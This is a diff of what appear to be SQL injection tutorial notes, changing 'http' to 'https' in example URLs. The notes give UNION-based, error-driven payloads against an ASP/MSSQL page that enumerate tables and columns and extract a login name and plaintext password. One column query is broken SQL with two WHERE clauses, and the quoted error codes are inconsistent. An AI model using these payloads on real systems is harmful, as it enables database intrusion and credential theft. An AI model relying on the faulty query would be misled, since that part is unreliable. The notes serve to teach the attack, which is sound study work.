@@ -772,9 +772,9 @@ The use of a LIKE clause, another method of SQL injection
 incorporating the UNION and LIKE statements is to use the **ODBC error message** to gather information from the database.
 
 Example 1:
-- the page `http://page/index.asp?id=20`.
+- the page `https://page/index.asp?id=20`.
 - use the UNION statement to set up a query as follows:
-  - `http://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --`
+  - `https://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --`
     - `<kbd>Information_Schema Tables</kbd>`: hold data on all the tables in the server database
     - `<kbd>Table Name</kbd> field`: holds name of each table in the database.
 
@@ -791,14 +791,14 @@ Example 1:
 > /index.asp, line 6
 
 - Then using the following statement,
-  - `http://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME not IN ('employeetable') --`
+  - `https://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME not IN ('employeetable') --`
   - the name of the next table in the database tables will be returned
 
 
 
 Example 2:
 - use the LIKE keyword in the following statement, additional information can be found:
-  - `http://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%25 login%25'--`
+  - `https://page/index.asp?id=20 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%25 login%25'--`
   - The term `'%25login%25'`: will be interpreted as `%login%` by the server.
   - The resulting **ODBC error message** would be:
     - The ODBC error message identifies a table name as `sys_login`.
@@ -808,7 +808,7 @@ Example 2:
 > /index.asp, line 6
 
 - The next step, obtain a `login_name` from the `sys_login table`:
-  - `http://page/index.asp?id=20 UNION SELECT TOP 1 login_name FROM sys_login --`
+  - `https://page/index.asp?id=20 UNION SELECT TOP 1 login_name FROM sys_login --`
   - The resulting **ODBC error message**:
     - provides the login name `whiteknight` from the `sys_login` table
 
@@ -818,7 +818,7 @@ Example 2:
 
 
 - To obtain the password for whiteknight:
-  - `http://page/index.asp?id=20 UNION SELECT TOP 1 password FROM sys_login where login_name='whiteknight' --`
+  - `https://page/index.asp?id=20 UNION SELECT TOP 1 password FROM sys_login where login_name='whiteknight' --`
   - The corresponding **ODBC error message**: gives the password for whiteknight is revealed: `rlkfoo3`.
 
 > Microsoft OLE DB Provider for ODBC Drivers error ‘80040907'
@@ -835,7 +835,7 @@ Once table identified, obtaining the column names provides valuable information 
 Examples:
 - acquire column names by accessing the database table `INFORMATION_SCHEMA.COLUMNS`.
 - The injection attack begins with the URL:
-  - `http://page/index.asp?id=20 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'parts' --`
+  - `https://page/index.asp?id=20 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'parts' --`
   - The corresponding **ODBC error message**: gives the first column name in `Parts` table as `partnum`
 
 > Microsoft OLE DB Provider for ODBC Drivers error '80040e07‘
@@ -843,7 +843,7 @@ Examples:
 > /index.asp, line 6
 
 - To obtain, the second column name, the expression `not IN ()` can be applied as shown:
-  - `http://page/index.asp?id=20 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'parts' WHERE COLUMN_NAME not IN ('partnum') --`
+  - `https://page/index.asp?id=20 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME= 'parts' WHERE COLUMN_NAME not IN ('partnum') --`
   - The corresponding **ODBC error message**: provides the next column name as `partcost`.
 
 > Microsoft OLE DB Provider for ODBC Drivers error '80040907‘
